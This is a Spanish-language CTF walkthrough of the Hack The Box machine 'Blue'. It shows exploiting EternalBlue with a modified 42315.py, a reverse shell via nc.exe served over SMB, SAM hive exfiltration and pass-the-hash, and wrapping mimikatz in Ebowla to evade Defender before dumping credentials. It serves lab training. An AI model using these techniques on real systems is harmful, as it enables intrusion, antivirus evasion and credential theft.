# Blue

Tags: [[_cve]],[[_persistenceTechniques]]

## Primeros pasos
(Reconocimiento).

<span style="color:#07b4f2">Organizamos</span> <span style="color:#ff2dc0">TMUX</span>.
<span style="color:#07b4f2">Activamos</span> <span style="color:#ff2dc0">VPN</span>.

Le <span style="color:#07b4f2">hacemos</span> un <span style="color:#ff2dc0">ping</span> <span style="color:#07b4f2">a</span> la <span style="color:#ff2dc0">máquina</span>. (<span style="color:#379075">Está activa o no</span>).
<span style="color:#bef202">Posible</span> <span style="color:#ff2dc0">máquina Windows</span>.

<span style="color:#07b4f2">Ponemos</span> la <span style="color:#ff2dc0">IP</span> de la <span style="color:#ff2dc0">máquina</span> <span style="color:#07b4f2">en</span> un <span style="color:#07b4f2">lugar visible</span>.
<span style="color:#07b4f2">Creamos</span> un <span style="color:#07b4f2">directorio</span> <span style="color:#07b4f2">como</span> la <span style="color:#ff2dc0">IP</span> o <span style="color:#07b4f2">nombre</span> de la <span style="color:#ff2dc0">máquina</span>.
<span style="color:#07b4f2">Creamos</span> los <span style="color:#07b4f2">directorios</span> de <span style="color:#07b4f2">trabajo</span>.

<span style="color:#bef202">Empezamos el escaneo con</span> <span style="color:#ff2dc0">NMAP</span>. <span style="color:#379075">Otro escaneo de puertos comunes por posibles falsos negativos</span>.
En este caso <span style="color:#07b4f2">no buscamos</span> <span style="color:#ff2dc0">codename</span> con <span style="color:#ff2dc0">launchpad</span>.

+ <span style="color:#ff669c">Puertos abiertos</span>

<span style="color:#ff669c">135</span> - RPC.
<span style="color:#ff669c">139</span> - NetBios.
<span style="color:#ff669c">445</span> - SMB. <span style="color:#379075">Windows 7</span>.
Y <span style="color:#07b4f2">más desde</span> el <span style="color:#ff669c">49152</span> en <span style="color:#07b4f2">adelante</span>.


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

<span style="color:#ff669c">445</span>.
Vemos que es un<span style="color:#ff2dc0"> Windows 7</span>, <span style="color:#07b4f2">probemos</span> si es vulnerable al <span style="color:#ff2dc0">Eternal Blue</span>.
<span style="color:#88c425">nmap --script="vuln and safe" -p445 10.10.10.40  -oN EBscan</span>:    <span style="color:#ff2dc0">vulnerable</span>.

<span style="color:#88c425">Clonamos</span> https://github.com/worawit/MS17-010
<span style="color:#88c425">python checker.py 10.10.10.40</span> :    con <span style="color:#ecacb6">python2.7</span> 
<span style="color:#07b4f2">No detecta</span> <span style="color:#ff2dc0">named pipes</span>, pero si <span style="color:#07b4f2">modificamos</span> el <span style="color:#ff2dc0">script</span> y ponemos<span style="color:#ecacb6"> USERNAME = 'guest'</span> sí funciona.

<span style="color:#07b4f2">Usamos</span> el <span style="color:#ecacb6">42315.py</span>, es el que <span style="color:#07b4f2">está</span> en <span style="color:#ff2dc0">searchsploit</span>, <span style="color:#379075">y lo metemos en el directorio MS17-010</span>.
<span style="color:#07b4f2">Modificamos</span> el <span style="color:#ecacb6">42315.py</span>
<span style="color:#ff2dc0">Comentamos</span> y <span style="color:#ff2dc0">descomentamos</span> lo <span style="color:#07b4f2">importante</span>.
![[Pasted image 20241208105113.png]]

Creamos un <span style="color:#ff2dc0">recurso compartido a nivel de red</span>, <span style="color:#07b4f2">ofreciendo</span> el <span style="color:#ecacb6">nc.exe</span>
Nos ponemos en <span style="color:#ff2dc0">escucha</span> por el <span style="color:#ff669c">puerto</span> especificado.
Ejecutamos el <span style="color:#ff2dc0">script</span>
<span style="color:#88c425">python 42315.py 10.10.10.40</span> :    y pa deeentro.


## Escalada

Enumerar todo el sistema.
Estamos como el usuario <span style="color:#ecacb6">nt authority\system</span> debido a que al <span style="color:#ff2dc0">explotar</span> el <span style="color:#ff2dc0">Eternal Blue</span>, se gana <span style="color:#07b4f2">acceso</span> como el <span style="color:#ecacb6">usuario</span> <span style="color:#ff2dc0">privilegiado</span>.

Fin.

<span style="color:#bef202">EXTRA</span>.
<span style="color:#ecacb6">1.-</span> <span style="color:#07b4f2">Obtener</span> <span style="color:#ff2dc0">Hashes NTLM</span>.
En <span style="color:#ff2dc0">máquina víctima</span>.
<span style="color:#88c425">reg save HKLM\sam sam.backup</span>
<span style="color:#88c425">reg save HKLM\system system.backup</span>

En <span style="color:#07b4f2">mi</span> <span style="color:#ff2dc0">máquina</span>.
Creo un <span style="color:#ff2dc0">recurso compartido</span> a nivel de red <span style="color:#07b4f2">por</span> <span style="color:#ff2dc0">SMB</span>.

En <span style="color:#ff2dc0">máquina víctima</span>.
<span style="color:#07b4f2">Me los</span> <span style="color:#ff2dc0">transfiero</span>.

En <span style="color:#07b4f2">mi</span> <span style="color:#ff2dc0">máquina</span>.
<span style="color:#88c425">impacket-secretsdump -sam sam.backup -system system.backup LOCAL</span>
![[Pasted image 20241208125302.png]]

<span style="color:#88c425">crackmapexec smb 10.10.10.40 -u 'administrator' -H 'cdf51b162460b7d5bc898f493751a0cc' --lsa</span> :    <span style="color:#07b4f2">tratar</span> de <span style="color:#07b4f2">ver</span> <span style="color:#ff2dc0">credenciales</span> en <span style="color:#ff2dc0">texto claro</span>.

<span style="color:#88c425">impacket-psexec WORKGROUP/Administrator@10.10.10.40 -hashes :cdf51b162460b7d5bc898f493751a0cc</span> :    <span style="color:#ff2dc0">conectarme</span> <span style="color:#07b4f2">con</span> <span style="color:#ff2dc0">psexec</span> 


<span style="color:#ecacb6">2.-</span><span style="color:#ff2dc0"> Dumpear credenciales </span><span style="color:#07b4f2">de</span> la <span style="color:#ff2dc0">memoria</span>.
En <span style="color:#07b4f2">mi</span> <span style="color:#ff2dc0">máquina</span>.
<span style="color:#ff2dc0">Ebowla</span> para <span style="color:#07b4f2">eludir</span> el <span style="color:#ff2dc0">Defender</span>.
Clonamos https://github.com/Genetic-Malware/Ebowla
<span style="color:#88c425">mv mimikatz.exe Ebowla</span>
<span style="color:#88c425">cd Ebowla</span>
<span style="color:#88c425">vim genetic.config</span>
<span style="color:#ecacb6">output_type = GO</span>
<span style="color:#ecacb6">payload_type = EXE</span>

<span style="color:#ecacb6">[[ENV_VAR]]</span> :    hay que <span style="color:#07b4f2">ponerlas bien</span>, porque <span style="color:#07b4f2">se toman</span> las <span style="color:#ff2dc0">variables de entorno</span> de la <span style="color:#07b4f2">propia</span> <span style="color:#ff2dc0">máquina</span> para lograr <span style="color:#07b4f2">subir</span> el <span style="color:#ff2dc0">archivo</span> deseado.
Con <span style="color:#07b4f2">estas</span> son <span style="color:#07b4f2">suficientes</span>.
![[Pasted image 20241208132242.png]]

Necesita <span style="color:#ecacb6">python2</span>, hago
<span style="color:#88c425">cp -r /home/joelkami/Documentos/HTB/Maquinas/Blue/content/Ebowla .</span> :    <span style="color:#07b4f2">lo llevo a</span> mi <span style="color:#ff2dc0">entorno virtual</span>.
<span style="color:#88c425">pip install configobj</span> :    lo necesita.
<span style="color:#88c425">apt install mingw-w64</span> :    lo necesita.

<span style="color:#88c425">python ebowla.py mimikatz.exe genetic.config</span> 
<span style="color:#88c425">./build_x64_go.sh output/go_symmetric_mimikatz.exe.go final_mimi.exe</span>
<span style="color:#88c425">ls output/final_mimi.exe</span> :    ya lo podríamos <span style="color:#ff2dc0">subir</span> <span style="color:#07b4f2">a</span> la <span style="color:#ff2dc0">máquina víctima</span>.

En <span style="color:#ff2dc0">máquina víctima</span>.
<span style="color:#88c425">final_mimi.exe</span> :    entramos a una <span style="color:#ff2dc0">sesión interactiva</span>.
<span style="color:#88c425">privilege::debug</span>
<span style="color:#88c425">sekurlsa::logonPasswords</span>
Y podríamos <span style="color:#07b4f2">ver</span> las <span style="color:#ff2dc0">credenciales</span> en <span style="color:#07b4f2">claro</span>.


<span style="color:#ecacb6">3.-</span> <span style="color:#ff2dc0">Habilitar</span> y <span style="color:#ff2dc0">conectarnos</span> <span style="color:#07b4f2">por</span> <span style="color:#ff2dc0">RDP</span>.
<span style="color:#88c425">crackmapexec smb 10.10.10.40 -u 'administrator' -p 'ejfnIWWDojfWEKM' -M rdp -o action=enable</span> :    usamos un <span style="color:#ff2dc0">módulo</span> de <span style="color:#ff2dc0">crackmapexec</span> para <span style="color:#07b4f2">habilitar</span> el <span style="color:#ff2dc0">RDP</span>.

<span style="color:#88c425">rdesktop 10.10.10.40 -u 'Administrator' -p 'ejfnIWWDojfWEKM'</span> 


<span style="color:#ecacb6">4.-</span> <span style="color:#ff2dc0">Persistence</span> (<span style="color:#379075">intrusive</span>).
En <span style="color:#ecacb6">Vulnerabilidades y Temas/Persistence Techniques/Persistence CheatSheets</span> <span style="color:#07b4f2">tenemos</span> distintas <span style="color:#07b4f2">vías</span>.
